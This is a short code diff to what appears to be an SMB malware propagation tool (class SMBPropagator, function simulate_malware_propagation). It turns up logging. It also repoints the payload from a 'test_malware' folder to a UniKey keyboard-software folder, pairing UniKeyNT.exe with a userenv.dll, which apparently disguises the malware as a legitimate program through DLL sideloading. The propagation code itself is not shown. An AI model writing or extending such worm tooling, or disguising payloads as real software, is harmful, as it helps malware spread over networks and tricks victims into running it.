@@ -8,7 +8,7 @@ import logging
 from pathlib import Path
 
 # Set up logging for propagator
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('propagator')
 
 class SMBPropagator:
@@ -153,8 +153,8 @@ class SMBPropagator:
 def simulate_malware_propagation():
     """Simulate malware propagation behavior"""
     # Paths to the malware files (using the ones from our project)
-    exe_path = r"C:\Users\JakeClark\Downloads\test_malware\malware.exe"
-    dll_path = r"C:\Users\JakeClark\Downloads\test_malware\userenv.dll"
+    exe_path = r"C:\Users\JakeClark\Downloads\unikey46RC2-230919-win64\UniKeyNT.exe"
+    dll_path = r"C:\Users\JakeClark\Downloads\unikey46RC2-230919-win64\userenv.dll"
     
     # Create test malware files if they don't exist
     os.makedirs(os.path.dirname(exe_path), exist_ok=True)
